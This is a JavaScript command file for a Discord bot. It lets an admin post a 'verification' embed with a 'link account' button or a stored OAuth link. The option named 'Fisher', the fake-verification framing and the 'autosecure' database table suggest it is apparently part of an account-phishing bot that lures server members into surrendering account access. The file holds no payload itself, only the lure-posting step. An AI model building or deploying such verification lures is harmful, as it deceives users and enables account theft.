const {
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  ApplicationCommandOptionType,
} = require("discord.js");
const { queryParams } = require("../../../db/db");
const getEmbed = require("../../utils/getEmbed");
const getButton = require("../../utils/getButton");
module.exports = {
  name: "embed",
  description: "Send your verification embed",
  options: [
    {
      name: "type",
      description: "Embed type",
      type: ApplicationCommandOptionType.String,
      required: true,
      choices: [
        {
          name: "Fisher",
          value: "main",
        },
        {
          name: "OAuth",
          value: "oauth",
        }
      ],
    },
  ],
  adminOnly: true,
  callback: async (client, interaction) => {
    try {
      await interaction.deferReply({ ephemeral: true });
      let choice = interaction.options.getString("type");
      if (choice == "main") {
        let embed = await getEmbed(client.username, `main`);
        let button = await getButton(client.username, `link account`);
        
        try {
          await interaction.channel.send({
            embeds: [embed],
            components: [
              new ActionRowBuilder().addComponents(button)
            ]
          });
          return interaction.editReply({ content: `Embed sent successfully!`, ephemeral: true });
        } catch (e) {
          console.log(e);
          return interaction.editReply({
            content: `Failed to send the message.`,
            ephemeral: true
          });
        }
      } else if (choice == "oauth") {
        let oauthLink = await queryParams(`SELECT oauth_link FROM autosecure WHERE user_id=?`, [interaction.user.id]);
        if (!oauthLink[0].oauth_link) {
          return interaction.editReply({ content: `Set your oAuth link first.`, ephemeral: true });
        }
        oauthLink = oauthLink[0].oauth_link;
        let embed = await getEmbed(client.username, `oauth`);
        let button = await getButton(client.username, `oauth`, { url: oauthLink });
        try {
          await interaction.channel.send({
            embeds: [embed],
            components: [
              new ActionRowBuilder().addComponents(button)
            ]
          });
          return interaction.editReply({ content: `:white_check_mark:`, ephemeral: true });
        } catch (e) {
          console.log(e);
          return interaction.editReply({
            content: `Failed to send the message.`,
            ephemeral: true
          });
        }
      } else {
        return interaction.editReply({ content: `Invalid choice.`, ephemeral: true });
      }
    } catch (e) {
      console.error(e);
      if (!interaction.replied && !interaction.deferred) {
        await interaction.reply({
          content: 'An error occurred while processing your request.',
          ephemeral: true
        });
      }
    }
  },
};
